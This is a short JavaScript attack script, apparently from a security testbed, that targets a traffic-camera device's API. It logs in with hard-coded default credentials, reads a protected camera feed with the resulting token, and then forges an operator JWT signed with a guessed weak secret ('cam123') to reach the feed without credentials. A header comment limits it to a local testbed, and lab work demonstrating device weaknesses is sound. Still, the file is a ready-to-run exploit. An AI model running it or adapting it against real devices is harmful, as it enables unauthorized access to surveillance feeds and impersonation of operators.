/**
 * Attack 1: Default credential login + JWT secret forgery
 * Target: traffic-camera device (V1, V2)
 * Run only against your own local testbed.
 */
const axios = require("axios");
const jwt = require("jsonwebtoken");

const BASE = process.env.CAMERA_URL || "http://localhost:4001";

async function main() {
  console.log("== Step 1: default credential login ==");
  const login = await axios.post(`${BASE}/api/login`, {
    username: "admin",
    password: "admin1234"
  });
  console.log("Got token via default creds:", login.data.token.slice(0, 20) + "...");

  console.log("\n== Step 2: access protected feed with stolen token ==");
  const feed1 = await axios.get(`${BASE}/api/feed`, {
    headers: { Authorization: `Bearer ${login.data.token}` }
  });
  console.log("Feed data:", feed1.data);

  console.log("\n== Step 3: forge a token WITHOUT valid creds (weak secret) ==");
  const forged = jwt.sign({ sub: "attacker", role: "operator" }, "cam123", { expiresIn: "1h" });
  const feed2 = await axios.get(`${BASE}/api/feed`, {
    headers: { Authorization: `Bearer ${forged}` }
  });
  console.log("Feed accessed with forged token:", feed2.data);
}

main().catch(e => console.error("Attack failed:", e.response?.data || e.message));
